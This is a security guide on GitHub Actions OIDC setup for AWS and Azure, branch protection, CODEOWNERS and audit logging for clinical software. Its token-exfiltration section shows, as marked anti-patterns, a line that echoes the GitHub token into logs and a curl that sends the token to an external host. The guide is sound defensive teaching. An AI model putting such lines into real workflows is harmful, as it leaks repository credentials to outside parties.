# OIDC Best Practices & Branch Protection

This document outlines security best practices for GitHub Actions OIDC authentication and branch protection rules for clinical health software.

---

## 🔐 OIDC (OpenID Connect) Authentication

### Why OIDC?

OIDC eliminates the need for static secrets by allowing GitHub Actions to authenticate with cloud providers using short-lived tokens.

| Traditional Secrets | OIDC Tokens |
|---------------------|-------------|
| Long-lived credentials | Short-lived (15 min default) |
| Stored in GitHub Secrets | Generated on-demand |
| Manual rotation required | Auto-rotating |
| Broad access if leaked | Scoped to workflow run |
| Audit trail limited | Full audit trail |

### Configuring OIDC for AWS

#### 1. Create IAM OIDC Identity Provider

```bash
aws iam create-open-id-connect-provider \
  --url https://token.actions.githubusercontent.com \
  --client-id-list sts.amazonaws.com \
  --thumbprint-list 6938fd4d98bab03faadb97b34396831e3780aea1
```

#### 2. Create IAM Role with Trust Policy

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::ACCOUNT_ID:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        },
        "StringLike": {
          "token.actions.githubusercontent.com:sub": "repo:ORG/REPO:*"
        }
      }
    }
  ]
}
```

#### 3. Restrict by Environment (Recommended)

```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:ORG/REPO:environment:production"
    }
  }
}
```

#### 4. Use in Workflow

```yaml
permissions:
  id-token: write  # Required for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: us-east-1
```

### Configuring OIDC for Azure

#### 1. Create App Registration

```bash
az ad app create --display-name "GitHub-Actions-OIDC"
```

#### 2. Add Federated Credential

```json
{
  "name": "github-main-branch",
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "repo:ORG/REPO:ref:refs/heads/main",
  "audiences": ["api://AzureADTokenExchange"]
}
```

#### 3. Use in Workflow

```yaml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Azure Login
        uses: azure/login@6c251865b4e6290e7b78be643ea2d005bc51f69a # v2.1.1
        with:
          client-id: ${{ vars.AZURE_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
```

---

## 🛡️ OIDC Security Hardening

### 1. Scope Tokens Narrowly

```json
// ❌ Too broad - allows any branch
"sub": "repo:ORG/REPO:*"

// ✅ Specific branch
"sub": "repo:ORG/REPO:ref:refs/heads/main"

// ✅ Specific environment
"sub": "repo:ORG/REPO:environment:production"

// ✅ Pull request events only
"sub": "repo:ORG/REPO:pull_request"
```

### 2. Use Environment Protection

```yaml
jobs:
  deploy:
    environment: production  # Enforces environment rules
    runs-on: ubuntu-latest
```

### 3. Limit IAM Permissions

Apply least-privilege IAM policies:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:PutObject",
        "s3:GetObject"
      ],
      "Resource": "arn:aws:s3:::my-deploy-bucket/*"
    }
  ]
}
```

### 4. Audit Token Usage

Enable CloudTrail/Azure Activity Log to track:
- `AssumeRoleWithWebIdentity` events
- Source IP, workflow run ID, actor

---

## 🔒 Branch Protection Rules

### Main Branch Configuration

Apply these rules to `main` (and optionally `develop`):

#### Required Reviews

| Setting | Value | Rationale |
|---------|-------|-----------|
| Required approving reviews | 1 | Human oversight for all changes |
| Dismiss stale approvals | ✅ | Force re-review after new commits |
| Require review from code owners | ✅ | Domain experts review their areas |
| Restrict dismissal | ✅ | Only maintainers can dismiss |

#### Required Status Checks

| Check | Required | Description |
|-------|----------|-------------|
| `lint` | ✅ | Code style enforcement |
| `test` | ✅ | Unit and integration tests |
| `security-scan` | ✅ | Vulnerability detection |
| `compliance` | ✅ | Regulatory compliance |

```yaml
# These jobs must pass before merge
required_status_checks:
  strict: true  # Branch must be up to date
  contexts:
    - "PR Check / Lint"
    - "PR Check / Test"
    - "PR Check / Security Scan"
    - "PR Check / Compliance Check"
```

#### Additional Protections

| Setting | Value | Rationale |
|---------|-------|-----------|
| Require linear history | ✅ | Clean, auditable git history |
| Include administrators | ✅ | Rules apply to everyone |
| Restrict force pushes | ✅ | Prevent history rewriting |
| Restrict deletions | ✅ | Prevent branch deletion |
| Require signed commits | ⚡ Optional | GPG signature verification |
| Require deployments | ✅ | Deployment must succeed |

### CODEOWNERS File

Create `.github/CODEOWNERS`:

```plaintext
# Default owners
* @org/maintainers

# Workflow changes require DevOps review
.github/workflows/ @org/devops @org/security

# Compliance-sensitive code
/backend/src/consent/ @org/compliance @org/backend
/backend/src/audit/ @org/compliance @org/backend

# Mobile app
/mobile/ @org/mobile

# Infrastructure
/infra/ @org/devops @org/security
```

---

## 🚫 Preventing Privilege Escalation

### 1. Restrict Workflow Modifications

PRs modifying `.github/workflows/` should require:
- DevOps team review
- Security team review
- Workflow audit agent check

### 2. Prevent Token Exfiltration

```yaml
# ❌ Dangerous - token in logs
- run: echo ${{ secrets.GITHUB_TOKEN }}

# ❌ Dangerous - token to external service
- run: curl -H "Authorization: ${{ secrets.GITHUB_TOKEN }}" https://external.com

# ✅ Safe - token only used internally
- uses: actions/github-script@v7
  with:
    github-token: ${{ secrets.GITHUB_TOKEN }}
```

### 3. Disable Fork PR Token Access

In repository settings:
- **Fork pull requests**: Require approval for first-time contributors
- **Secrets**: Do not pass secrets to fork PRs

### 4. Use Environment Secrets

Prefer environment-scoped secrets over repository secrets:

```yaml
jobs:
  deploy:
    environment: production  # Only this job can access production secrets
```

---

## 📊 Audit & Compliance

### Audit Log Retention

Configure organization audit log streaming to:
- S3/Azure Blob for long-term retention
- SIEM for real-time monitoring

### Key Events to Monitor

| Event | Description |
|-------|-------------|
| `workflows.workflow_run_started` | Workflow execution began |
| `repo.protected_branch.update` | Branch protection changed |
| `repo.create_deployment` | Deployment created |
| `secret.create` / `secret.delete` | Secret management |
| `org.oidc_provider.create` | OIDC provider added |

### Compliance Documentation

For each release, generate attestation including:
- Build provenance (SLSA)
- Dependency manifest (SBOM)
- Security scan results
- Approval chain

---

## ✅ Implementation Checklist

### OIDC Setup

- [ ] Create cloud IAM OIDC provider
- [ ] Create IAM role with scoped trust policy
- [ ] Restrict to specific environments/branches
- [ ] Test with dry-run deployment
- [ ] Document role ARNs/IDs in repository variables

### Branch Protection

- [ ] Enable required reviews (1+)
- [ ] Enable dismiss stale approvals
- [ ] Configure required status checks
- [ ] Enable linear history
- [ ] Include administrators
- [ ] Restrict force pushes
- [ ] Create CODEOWNERS file

### Monitoring

- [ ] Enable audit log streaming
- [ ] Configure alerts for protection changes
- [ ] Schedule quarterly access review
